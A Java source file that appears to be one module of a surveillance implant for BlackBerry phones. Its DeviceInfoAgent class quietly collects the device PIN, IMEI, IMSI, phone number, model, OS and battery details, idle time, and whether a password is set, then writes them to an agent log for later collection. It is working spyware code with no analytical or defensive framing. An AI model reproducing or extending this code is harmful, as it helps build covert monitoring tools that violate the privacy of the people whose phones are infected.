package com.ht.rcs.blackberry.agent;

import net.rim.device.api.system.DeviceInfo;

import com.ht.rcs.blackberry.Device;

import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogType;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class DeviceInfoAgent extends Agent {
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);

    Device device;

    public DeviceInfoAgent(boolean agentStatus) {
        super(AGENT_DEVICE, agentStatus, true);
        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.DEVICE,
                "Wrong Conversion");

        device = Device.getInstance();
    }

    protected DeviceInfoAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        debug.trace("run");

        Check.requires(log != null, "Null log");

        log.createLog(null);

        boolean ret = true;

        StringBuffer sb = new StringBuffer();

        // Modello
        sb.append("Processor: ARM\n");
        sb.append("Simultator: " + DeviceInfo.isSimulator() + "\n");
        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
        sb.append("Pin: " + DeviceInfo.getDeviceId() + "\n");

        // Alimentazione
        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "\n");
        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                + "\n");
        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + "\n");

        // DISK
        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + "\n");

        // OS Version
        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");

        // Device
        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
        sb.append("IMEI: " + device.getImei() + "\n");
        sb.append("IMSI: " + device.getImsi() + "\n");
        sb.append("Phone: " + device.getPhoneNumber() + "\n");

        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");

        ret = log.writeLog(sb.toString(), true);

        if (ret == false) {
            debug.error("Error writing file");
        }

        log.close();

        this.sleepUntilStopped();
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
